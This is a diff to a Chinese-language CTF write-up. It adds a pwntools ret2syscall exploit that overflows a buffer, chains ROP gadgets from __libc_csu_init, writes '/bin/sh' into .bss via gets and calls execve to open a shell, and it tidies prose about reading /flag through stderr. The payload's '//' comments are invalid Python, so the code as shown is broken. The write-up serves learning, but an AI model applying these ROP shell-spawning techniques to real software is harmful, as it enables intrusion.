@@ -165,7 +165,47 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 .text:00000000004011AE                 syscall                 ; LINUX -
 ```
 
-可以
+几个知识点：
+
+- `syscall` 会根据 `rax` 中存储的系统调用号来执行对应的系统调用函数。
+- `__lib_csu_init` 中有两个方便的 gadgets 可以供我们使用。
+- 过程中需要的字段可以通过 gets 存储到 .bss 段中使用。
+
+```python
+from pwn import *
+
+context(arch="amd64", os="linux")
+
+# s = gdb.debug("./ret2syscall", "break main")
+s = process("./ret2syscall")
+elf = ELF("./ret2syscall")
+
+setrax = 0x401196
+syscall = 0x4011AA
+csu1 = 0x4012DA
+csu2 = 0x4012C0
+rdi = 0x4012E3
+
+bss = 0x404500
+execve = 0x3B
+
+payload = flat([
+    b"a" * 0x18,          // 覆盖到 retn 地址
+    rdi, bss,             // 将 rdi 设置为 bss 起始地址
+    elf.plt.gets,         // 执行 gets，将自定义数据写入 rdi 指向的值
+    rdi, execve,          // 将 rdi 设置为 execve 的系统调用号
+    setrax,               // 将 rax 的值设置为 rdi 指向的值
+
+    csu1, 0, 0,  bss, 0, 0, bss+8,
+    csu2
+])
+
+s.recvuntil("Input: ")
+s.sendline(payload)
+s.sendline(b"/bin/sh\0"+p64(syscall))
+s.interactive()
+
+```
 
 ### [Week3] all-in-files
 
@@ -200,7 +240,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-大致思路是读取`/flag`中的内容，然后输出到屏幕。注意到标准输出流（fd=1）被关闭了，可以用标准错误流（fd=2）代替。
+大致思路是读取 `/flag` 中的内容，然后输出到屏幕。注意到标准输出流（fd=1）被关闭了，可以用标准错误流（fd=2）代替。
 
 ```bash
 Input filename to open: /flag
@@ -209,9 +249,9 @@ Input file id to write to: 2
 
 ```
 
-发现程序并没有返回任何内容。打开gdb进行调试，发现在读入`filename`的时候，读取的是`/flag\n`，最终`fd`的值为`-1`，推测是因为末尾的`\n`导致无法读取成功，最后因为标准输出流被关闭了，所以不会输出`Failed to open file!`提示用户。
+发现程序并没有返回任何内容。打开gdb进行调试，发现在读入 `filename` 的时候，读取的是 `/flag\n`，最终`fd`的值为 `-1`，推测是因为末尾的`\n`导致无法读取成功，最后因为标准输出流被关闭了，所以不会输出 `Failed to open file!` 提示用户。
 
-使用`pwntools`来输入`/flag\0`，保证不会因为`\n`的原因而无法读取文件：
+使用 `pwntools` 来输入 `/flag\0`，保证不会因为 `\n` 的原因而无法读取文件：
 
 ```python
 from pwn import *
